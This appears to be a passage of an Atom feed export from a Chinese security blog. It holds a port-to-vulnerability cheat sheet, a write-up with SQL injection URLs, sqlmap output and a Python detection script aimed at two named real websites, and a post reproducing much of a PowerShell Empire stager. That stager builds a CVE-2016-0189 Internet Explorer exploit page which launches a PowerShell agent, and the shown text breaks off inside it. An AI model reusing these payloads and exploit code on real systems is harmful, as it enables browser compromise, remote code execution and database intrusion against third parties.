rel="noopener">https://zhuanlan.zhihu.com/p/21296806?refer=Anonymous0</a></p><p><a href="http://www.s2.sshz.org/post/source-code-leak/" target="_blank" rel="noopener">http://www.s2.sshz.org/post/source-code-leak/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;背景&quot;&gt;&lt;a href=&quot;#背景&quot; class=&quot;headerlink&quot; title=&quot;背景&quot;&gt;&lt;/a&gt;背景&lt;/h3&gt;&lt;p&gt;本文主要是记录一下常见的源码泄漏问题，这些经常在web渗透测试以及CTF中出现。&lt;/p&gt;
&lt;h3 id=&quot;源码泄漏分类&quot;&gt;&lt;a href=&quot;
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>PORT=&gt;服务/漏洞</title>
    <link href="http://zer0yu.github.io/2017/01/24/PORT-%E6%9C%8D%E5%8A%A1-%E6%BC%8F%E6%B4%9E/"/>
    <id>http://zer0yu.github.io/2017/01/24/PORT-服务-漏洞/</id>
    <published>2017-01-24T07:29:05.000Z</published>
    <updated>2017-01-24T07:37:56.000Z</updated>
    
    <content type="html"><![CDATA[<p>范围：0-65535<br>固定端口：0-1023 1024保留<br>动态端口：1024-65535</p><h4 id="常用端口"><a href="#常用端口" class="headerlink" title="常用端口"></a>常用端口</h4><p>21：FTP(爆破)</p><p>22：SSH(爆破)</p><p>23：Telnet(爆破)</p><p>25：SMTP</p><p>53：DNS（UDP）</p><p>69：TFTP（cisco，类似FTP）</p><p>79：Finger</p><p>80：HTTP</p><p>110：POP3</p><p>111：RPC 远程过程调用</p><p>113：windows 验证服务</p><p>119：NNTP 网络新闻组传输协议</p><p>135：RPC 远程过程调用</p><p>137：NetBIOS</p><p>139：windows文件和打印机共享，Unix中的samba服务</p><p>161：SNMP 简单网络管理协议</p><p>389：LDAP</p><p>443：HTTPS</p><p>445：SMB</p><p>1080：socks代理服务</p><p>2082/2083 cpanel主机管理系统登陆 (国外用较多)</p><p>2222 DA虚拟主机管理系统登陆 (国外用较多)</p><p>2601,2604：zebra路由，默认密码zebra</p><p>3128 squid代理默认端口，如果没设置口令很可能就直接漫游内网了 </p><p>3312/3311 kangle主机管理系统登陆 </p><p>3389:远程桌面</p><p>4440 rundeck 参考WooYun: 借用新浪某服务成功漫游新浪内网 </p><p>5900：vnc</p><p>6082 varnish 参考WooYun: Varnish HTTP accelerator CLI 未授权访问易导致网站被直接篡改或者作为代理进入内网</p><p>7001,7002 WebLogic默认弱口令，反序列</p><p>8000-9090 都是一些常见的web端口，有些运维喜欢把管理后台开在这些非80的端口上 </p><p>8080：用户www代理服务,tomcat/WDCP主机管理系统，默认弱口令 </p><p>8080,8089,9090 JBOSS</p><p>8083 Vestacp主机管理系统 （国外用较多） </p><p>8649 ganglia </p><p>8888 amh/LuManager 主机管理系统默认端口 </p><p>9200,9300 elasticsearch 参考WooYun: 多玩某服务器ElasticSearch命令执行漏洞 </p><p>10000 Virtualmin/Webmin 服务器虚拟主机管理系统 </p><p>11211 memcache未授权访问 </p><p>27017,27018 Mongodb未授权访问 </p><p>28017 mongodb统计页面 </p><p>50000 SAP命令执行 </p><p>50070,50030 hadoop默认端口未授权访问</p><h4 id="木马病毒"><a href="#木马病毒" class="headerlink" title="木马病毒"></a>木马病毒</h4><p>5554：worm.Sasser病毒利用端口<br>7626：冰河病毒<br>8011：WAY2.4病毒<br>7306：Netspy3.0病毒<br>1024：YAI病毒</p><h4 id="中间件"><a href="#中间件" class="headerlink" title="中间件"></a>中间件</h4><p>7001,7002：weblogic<br>9080：webshpere应用程序<br>9090：webshpere管理工具<br>8080：tomcat默认端口<br>Jboss通常占用的端口是1098，1099，4444，4445，8080，8009，8083，8093，默认为8080</p><h4 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h4><p>3306：mysql<br>1433：mssqlserver<br>1434：sqlserver monitor<br>1521：oracle:(iSqlPlus Port:5560,7778)<br>5432：PostgreSQL<br>1158：ORACLE EMCTL<br>8080：Oracle XDB<br>2100：Oracle XDB FTP</p><h4 id="特殊服务（漏洞）"><a href="#特殊服务（漏洞）" class="headerlink" title="特殊服务（漏洞）"></a>特殊服务（漏洞）</h4><p>443：SSL心脏滴血</p><p>512,513,514：Rsync未授权访问</p><p>873：Rsync未授权访问</p><p>1025,111 NFS </p><p>2375：docker remote api漏洞</p><p>50000：SAP命令执行</p><p>5984：CouchDB <a href="http://xxx:5984/_utils/" target="_blank" rel="noopener">http://xxx:5984/_utils/</a></p><p>6379：redis未授权</p><p>7001,7002：WebLogic 默认弱口令，反序列化</p><p>9200,9300：elasticsearch未授权访问</p><p>11211：memcache未授权访问</p><p>27017,27018：Mongodb 未授权访问<br>28017：mongodb统计页面</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;范围：0-65535&lt;br&gt;固定端口：0-1023 1024保留&lt;br&gt;动态端口：1024-65535&lt;/p&gt;
&lt;h4 id=&quot;常用端口&quot;&gt;&lt;a href=&quot;#常用端口&quot; class=&quot;headerlink&quot; title=&quot;常用端口&quot;&gt;&lt;/a&gt;常用端口&lt;/h4&gt;&lt;p&gt;21：
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>BugScan插件编写</title>
    <link href="http://zer0yu.github.io/2017/01/22/BugScan%E6%8F%92%E4%BB%B6%E7%BC%96%E5%86%99/"/>
    <id>http://zer0yu.github.io/2017/01/22/BugScan插件编写/</id>
    <published>2017-01-22T03:23:35.000Z</published>
    <updated>2017-01-22T04:40:59.000Z</updated>
    
    <content type="html"><![CDATA[<p>最近四叶草又开始招收实习了，所以某个妹子就投了简历。不久四叶草发来一个题目要妹子完成。So？这意味着什么，这意味着一个泡妹子的好时机来了啊。哈哈哈……</p><p>下面就让我们看看这个题目：</p><p>某通用平台被曝出有一处高危注入，以下为详情：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.exploit.com/livefiles/pages/inner/userlist.aspx?ModuleType=Friends&amp;RelatedUserType=Friends&amp;UserModuleClientID=ctl00_ctl00_TemplateHolder_ContentHolder_ctl06&amp;userName=1</span><br></pre></td></tr></table></figure><p>userName处为一处报错注入，</p><p>请使用python编写一个通用脚本检测该处注入点(可使用任何python库)，<br>要求测试该脚本必须使用多个目标站点。<br>以下为两个测试站点（请勿做除测试之外的任何危险动作）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://www.jmsyzx.com/</span><br><span class="line">http://www.globechildren.com/</span><br></pre></td></tr></table></figure><p>哎呦，不限制python库，一个通用脚本。刚跟室友开黑了一下守望先锋（挺好玩儿的，有兴趣一起啊）的我刚看也是一脸懵逼，总之刚开始想的太多了，但其实也就是一个插件的事情（还是range一棒打醒我，所以以后还是干完正事再开黑）。</p><p>看了一下是mssql数据库，并且是报错注入。我们可以手工构造看数据库类型：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.jmsyzx.com/livefiles/pages/inner/userlist.aspx?ModuleType=Friends&amp;RelatedUserType=Friends&amp;UserModuleClientID=ctl00_ctl00_TemplateHolder_ContentHolder_ctl06&amp;userName=1%27%20and%201=@@version--</span><br></pre></td></tr></table></figure><p>也可以sqlmap跑一下看看：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">[22:07:32] [INFO] resuming back-end DBMS &apos;microsoft sql server&apos;</span><br><span class="line">[22:07:32] [INFO] testing connection to the target URL</span><br><span class="line">sqlmap resumed the following injection point(s) from stored session:</span><br><span class="line">---</span><br><span class="line">Parameter: userName (GET)</span><br><span class="line">Type: error-based</span><br><span class="line">Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause</span><br><span class="line">Payload: ModuleType=Friends&amp;RelatedUserType=Friends&amp;UserModuleClientID=ctl00_ctl00_TemplateHolder_ContentHolder_ctl06&amp;userName=1&apos; AND 2390=CONVERT(INT,(SELECT CHAR(113)+CHAR(107)+CHAR(98)+CHAR(113)+CHAR(113)+(SELECT (CASE WHEN (2390=2390) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(98)+CHAR(112)+CHAR(118)+CHAR(113))) AND &apos;nTAv&apos;=&apos;nTAv</span><br><span class="line">Type: stacked queries</span><br><span class="line">Title: Microsoft SQL Server/Sybase stacked queries (comment)</span><br><span class="line">Payload: ModuleType=Friends&amp;RelatedUserType=Friends&amp;UserModuleClientID=ctl00_ctl00_TemplateHolder_ContentHolder_ctl06&amp;userName=1&apos;;WAITFOR DELAY &apos;0:0:5&apos;--</span><br><span class="line">Type: AND/OR time-based blind</span><br><span class="line">Title: Microsoft SQL Server/Sybase time-based blind (comment)</span><br><span class="line">Payload: ModuleType=Friends&amp;RelatedUserType=Friends&amp;UserModuleClientID=ctl00_ctl00_TemplateHolder_ContentHolder_ctl06&amp;userName=1&apos; WAITFOR DELAY &apos;0:0:5&apos;--</span><br><span class="line">---</span><br><span class="line">[22:07:33] [INFO] the back-end DBMS is Microsoft SQL Server</span><br><span class="line">web server operating system: Windows 2008 R2 or 7</span><br><span class="line">web application technology: ASP.NET, Microsoft IIS 7.5</span><br><span class="line">back-end DBMS: Microsoft SQL Server 2005</span><br><span class="line">[22:07:33] [INFO] fetched data logged to text files under &apos;C:\Users\ZEROYU\.sqlmap\output\www.jmsyzx.com&apos;</span><br></pre></td></tr></table></figure><p>别多看看那个GET就行了，GET最简单了。<br>我们就抓住报错跟打印MD5这两点就行了。</p><p>打印MD5呢，mssql有两种方式：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.http://www.jmsyzx.com/livefiles/pages/inner/userlist.aspx?ModuleType=Friends&amp;RelatedUserType=Friends&amp;UserModuleClientID=ctl00_ctl00_TemplateHolder_ContentHolder_ctl06&amp;userName=1%27%20and%201=sys.fn_sqlvarbasetostr(HashBytes(%27MD5%27,%27123456%27))--</span><br><span class="line"></span><br><span class="line">2.http://www.jmsyzx.com/livefiles/pages/inner/userlist.aspx?ModuleType=Friends&amp;RelatedUserType=Friends&amp;UserModuleClientID=ctl00_ctl00_TemplateHolder_ContentHolder_ctl06&amp;userName=1%27%20and%201=sys.fn_varbintohexstr(hashbytes(%27MD5%27,%271234%27))--</span><br></pre></td></tr></table></figure><p>直接上我写的脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/evn python</span></span><br><span class="line"><span class="comment">#-*-:coding:utf-8 -*-</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">POC Name : 泡妹专享</span></span><br><span class="line"><span class="string">Author : zeroyu</span></span><br><span class="line"><span class="string">mail : zeroyu.xyz@gmail.com</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="keyword">import</span> hackhttp</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">assign</span><span class="params">(service, arg)</span>:</span></span><br><span class="line"><span class="keyword">if</span> service == <span class="string">'fingerprint.girl'</span>:</span><br><span class="line"><span class="keyword">return</span> <span class="literal">True</span>, arg</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">audit</span><span class="params">(arg)</span>:</span></span><br><span class="line">payload = <span class="string">"/livefiles/pages/inner/userlist.aspx?ModuleType=Friends&amp;RelatedUserType=Friends&amp;UserModuleClientID=ctl00_ctl00_TemplateHolder_ContentHolder_ctl06&amp;userName=1%27%20and%201=sys.fn_varbintohexstr(hashbytes(%27MD5%27,%271234%27))--"</span></span><br><span class="line">url = arg + payload</span><br><span class="line">code, head, res, errcode, _ = hackhttp.http(url)</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line"><span class="keyword">if</span> code == <span class="number">500</span> <span class="keyword">and</span> <span class="string">'81dc9bdb52d04dc20036dbd8313ed055'</span> <span class="keyword">in</span> res:</span><br><span class="line">security_hole(url)</span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">'__main__'</span>:</span><br><span class="line"><span class="keyword">from</span> dummy <span class="keyword">import</span> *</span><br><span class="line">audit(assign(<span class="string">'fingerprint.girl'</span>,<span class="string">'http://www.jmsyzx.com/'</span>)[<span class="number">1</span>])</span><br></pre></td></tr></table></figure><p>是不是想问我hackhttp是个什么库，看<a href="http://doc.bugscan.net/" target="_blank" rel="noopener">文档</a>去。</p><p>好，今天妹子就泡到这儿。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;最近四叶草又开始招收实习了，所以某个妹子就投了简历。不久四叶草发来一个题目要妹子完成。So？这意味着什么，这意味着一个泡妹子的好时机来了啊。哈哈哈……&lt;/p&gt;
&lt;p&gt;下面就让我们看看这个题目：&lt;/p&gt;
&lt;p&gt;某通用平台被曝出有一处高危注入，以下为详情：&lt;/p&gt;
&lt;figur
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>POWERSHELL EMPIRE + CVE-2016-0189 = PROFIT</title>
    <link href="http://zer0yu.github.io/2017/01/22/POWERSHELL-EMPIRE-CVE-2016-0189-PROFIT/"/>
    <id>http://zer0yu.github.io/2017/01/22/POWERSHELL-EMPIRE-CVE-2016-0189-PROFIT/</id>
    <published>2017-01-22T03:21:47.000Z</published>
    <updated>2017-01-22T03:23:19.000Z</updated>
    
    <content type="html"><![CDATA[<p>​    Powershell Empire 是我们在渗透目标用户时一直都很喜欢的工具之一，虽然我们通常都是用Metaspolit和Empire来一起完成工作，使浏览器漏洞和经验结合在Empire中。<br>在最近的一次测试中我们没有选择去使用MSF，相反我们和一个新的“经验丰富”的Empire一起利用CVE-2016-0189（也就是vbscrupt_godmode）其攻击使用IE9—11的用户。Empire是近6个月来我们首选的使用并且最近开始打造漏洞工具箱。如果成功，powershell将会登录并通过一个代理链接到Empire。重要的是硬盘上不会留下任何信息。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> lib.common <span class="keyword">import</span> helpers</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Stager</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, mainMenu, params=[])</span>:</span></span><br><span class="line"></span><br><span class="line">        self.info = &#123;</span><br><span class="line">            <span class="string">'Name'</span>: <span class="string">'MS16-051 IE RCE'</span>,</span><br><span class="line"></span><br><span class="line">            <span class="string">'Author'</span>: [<span class="string">'www.cgsec.co.uk'</span>],</span><br><span class="line"></span><br><span class="line">            <span class="string">'Description'</span>: (<span class="string">'Leverages MS16-051 to execute powershell in unpatched browsers. This is a file-less vector which works on IE9/10/11 and all versions of Windows'</span>),</span><br><span class="line"></span><br><span class="line">            <span class="string">'Comments'</span>: [</span><br><span class="line">                <span class="string">'Target will have to open link with vulnerable version of IE.'</span></span><br><span class="line">            ]</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment"># any options needed by the stager, settable during runtime</span></span><br><span class="line">        self.options = &#123;</span><br><span class="line">            <span class="comment"># format:</span></span><br><span class="line">            <span class="comment">#   value_name : &#123;description, required, default_value&#125;</span></span><br><span class="line">            <span class="string">'Listener'</span> : &#123;</span><br><span class="line">                <span class="string">'Description'</span>   :   <span class="string">'Listener to generate stager for.'</span>,</span><br><span class="line">                <span class="string">'Required'</span>      :   <span class="literal">True</span>,</span><br><span class="line">                <span class="string">'Value'</span>         :   <span class="string">''</span></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="string">'StagerRetries'</span> : &#123;</span><br><span class="line">                <span class="string">'Description'</span>   :   <span class="string">'Times for the stager to retry connecting.'</span>,</span><br><span class="line">                <span class="string">'Required'</span>      :   <span class="literal">False</span>,</span><br><span class="line">                <span class="string">'Value'</span>         :   <span class="string">'0'</span></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="string">'OutFile'</span> : &#123;</span><br><span class="line">                <span class="string">'Description'</span>   :   <span class="string">'File to output HTML to, otherwise displayed on the screen.'</span>,</span><br><span class="line">                <span class="string">'Required'</span>      :   <span class="literal">True</span>,</span><br><span class="line">                <span class="string">'Value'</span>         :   <span class="string">''</span></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="string">'Base64'</span> : &#123;</span><br><span class="line">                <span class="string">'Description'</span>   :   <span class="string">'Switch. Base64 encode the powershell output.'</span>,</span><br><span class="line">                <span class="string">'Required'</span>      :   <span class="literal">True</span>,</span><br><span class="line">                <span class="string">'Value'</span>         :   <span class="string">'True'</span></span><br><span class="line">            &#125;,            </span><br><span class="line">            <span class="string">'UserAgent'</span> : &#123;</span><br><span class="line">                <span class="string">'Description'</span>   :   <span class="string">'User-agent string to use for the staging request (default, none, or other).'</span>,</span><br><span class="line">                <span class="string">'Required'</span>      :   <span class="literal">False</span>,</span><br><span class="line">                <span class="string">'Value'</span>         :   <span class="string">'default'</span></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="string">'Proxy'</span> : &#123;</span><br><span class="line">                <span class="string">'Description'</span>   :   <span class="string">'Proxy to use for request (default, none, or other).'</span>,</span><br><span class="line">                <span class="string">'Required'</span>      :   <span class="literal">False</span>,</span><br><span class="line">                <span class="string">'Value'</span>         :   <span class="string">'default'</span></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="string">'ProxyCreds'</span> : &#123;</span><br><span class="line">                <span class="string">'Description'</span>   :   <span class="string">'Proxy credentials ([domain\]username:password) to use for request (default, none, or other).'</span>,</span><br><span class="line">                <span class="string">'Required'</span>      :   <span class="literal">False</span>,</span><br><span class="line">                <span class="string">'Value'</span>         :   <span class="string">'default'</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment"># save off a copy of the mainMenu object to access external functionality</span></span><br><span class="line">        <span class="comment">#   like listeners/agent handlers/etc.</span></span><br><span class="line">        self.mainMenu = mainMenu</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> param <span class="keyword">in</span> params:</span><br><span class="line">            <span class="comment"># parameter format is [Name, Value]</span></span><br><span class="line">            option, value = param</span><br><span class="line">            <span class="keyword">if</span> option <span class="keyword">in</span> self.options:</span><br><span class="line">                self.options[option][<span class="string">'Value'</span>] = value</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">generate</span><span class="params">(self)</span>:</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># extract all of our options</span></span><br><span class="line">        listenerName = self.options[<span class="string">'Listener'</span>][<span class="string">'Value'</span>]</span><br><span class="line">        base64 = self.options[<span class="string">'Base64'</span>][<span class="string">'Value'</span>]</span><br><span class="line">        userAgent = self.options[<span class="string">'UserAgent'</span>][<span class="string">'Value'</span>]</span><br><span class="line">        proxy = self.options[<span class="string">'Proxy'</span>][<span class="string">'Value'</span>]</span><br><span class="line">        proxyCreds = self.options[<span class="string">'ProxyCreds'</span>][<span class="string">'Value'</span>]</span><br><span class="line">        stagerRetries = self.options[<span class="string">'StagerRetries'</span>][<span class="string">'Value'</span>]</span><br><span class="line"></span><br><span class="line">        encode = <span class="literal">False</span></span><br><span class="line">        <span class="keyword">if</span> base64.lower() == <span class="string">"true"</span>:</span><br><span class="line">            encode = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># generate the launcher code</span></span><br><span class="line">        launcher = self.mainMenu.stagers.generate_launcher(listenerName, encode=encode, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds, stagerRetries=stagerRetries)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> launcher == <span class="string">""</span>:</span><br><span class="line">            <span class="keyword">print</span> helpers.color(<span class="string">"[!] Error in launcher command generation."</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="string">""</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">code =  <span class="string">"&lt;html&gt;\n"</span></span><br><span class="line">code += <span class="string">"&lt;head&gt;\n"</span></span><br><span class="line">code += <span class="string">"&lt;meta http-equiv=\"x-ua-compatible\" content=\"IE=10\"&gt;\n"</span></span><br><span class="line">code += <span class="string">"&lt;/head&gt;\n"</span></span><br><span class="line">code += <span class="string">"&lt;body&gt;\n"</span></span><br><span class="line">code += <span class="string">"    &lt;script type=\"text/vbscript\"&gt;\n"</span></span><br><span class="line">code += <span class="string">"        Dim aw\n"</span></span><br><span class="line">code += <span class="string">"        Dim plunge(32)\n"</span></span><br><span class="line">code += <span class="string">"        Dim y(32)\n"</span></span><br><span class="line">code += <span class="string">"        prefix = \"%u4141%u4141\"\n"</span></span><br><span class="line">code += <span class="string">"        d = prefix &amp; \"%u0016%u4141%u4141%u4141%u4242%u4242\"\n"</span></span><br><span class="line">code += <span class="string">"        b = String(64000, \"D\")\n"</span></span><br><span class="line">code += <span class="string">"        c = d &amp; b\n"</span></span><br><span class="line">code += <span class="string">"        x = UnEscape(c)\n"</span></span><br><span class="line">code += <span class="string">"\n"</span></span><br><span class="line">code += <span class="string">"        Class ArrayWrapper\n"</span></span><br><span class="line">code += <span class="string">"            Dim A()\n"</span></span><br><span class="line">code += <span class="string">"            Private Sub Class_Initialize\n"</span></span><br><span class="line">code += <span class="string">"                  ReDim Preserve A(1, 2000)\n"</span></span><br><span class="line">code += <span class="string">"            End Sub\n"</span></span><br><span class="line">code += <span class="string">"\n"</span></span><br><span class="line">code += <span class="string">"            Public Sub Resize()\n"</span></span><br><span class="line">code += <span class="string">"                ReDim Preserve A(1, 1)\n"</span></span><br><span class="line">code += <span class="string">"            End Sub\n"</span></span><br><span class="line">code += <span class="string">"        End Class\n"</span></span><br><span class="line">code += <span class="string">"\n"</span></span><br><span class="line">code += <span class="string">"        Class Dummy\n"</span></span><br><span class="line">code += <span class="string">"        End Class\n"</span></span><br><span class="line">code += <span class="string">"\n"</span></span><br><span class="line">code += <span class="string">"        Function getAddr (arg1, s)\n"</span></span><br><span class="line">code += <span class="string">"            aw = Null\n"</span></span><br><span class="line">code += <span class="string">"            Set aw = New ArrayWrapper\n"</span></span><br><span class="line">code += <span class="string">"\n"</span></span><br><span class="line">code += <span class="string">"            For i = 0 To 32\n"</span></span><br><span class="line">code += <span class="string">"                Set plunge(i) = s\n"</span></span><br><span class="line">code += <span class="string">"            Next\n"</span></span><br><span class="line">code += <span class="string">"\n"</span></span><br><span class="line">code += <span class="string">"            Set aw.A(arg1, 2) = s\n"</span></span><br><span class="line">code += <span class="string">"\n"</span></span><br><span class="line">code += <span class="string">"            Dim addr\n"</span></span><br><span class="line">code += <span class="string">"            Dim i\n"</span></span><br><span class="line">code += <span class="string">"            For i = 0 To 31\n"</span></span><br><span class="line">code += <span class="string">"                If Asc(Mid(y(i), 3, 1)) = VarType(s) Then\n"</span></span><br><span class="line">code += <span class="string">"                   addr = strToInt(Mid(y(i), 3 + 4, 2))\n"</span></span><br><span class="line">code += <span class="string">"                End If\n"</span></span><br><span class="line">code += <span class="string">"                y(i) = Null\n"</span></span><br><span class="line">code += <span class="string">"            Next\n"</span></span><br><span class="line">code += <span class="string">"\n"</span></span><br><span class="line">code += <span class="string">"            If addr = Null Then\n"</span></span><br><span class="line">code += <span class="string">"                document.location.href = document.location.href\n"</span></span><br><span class="line">code += <span class="string">"                Return\n"</span></span><br><span class="line">code += <span class="string">"            End If\n"</span></span><br><span class="line">code += <span class="string">"            getAddr = addr\n"</span></span><br><span class="line">code += <span class="string">"        End Function\n"</span></span><br><span class="line">code += <span class="string">"\n"</span></span><br><span class="line">code += <span class="string">"        Function leakMem (arg1, addr)\n"</span></span><br><span class="line">code += <span class="string">"            d = prefix &amp; \"%u0008%u4141%u4141%u4141\"\n"</span></span><br><span class="line">code += <span class="string">"            c = d 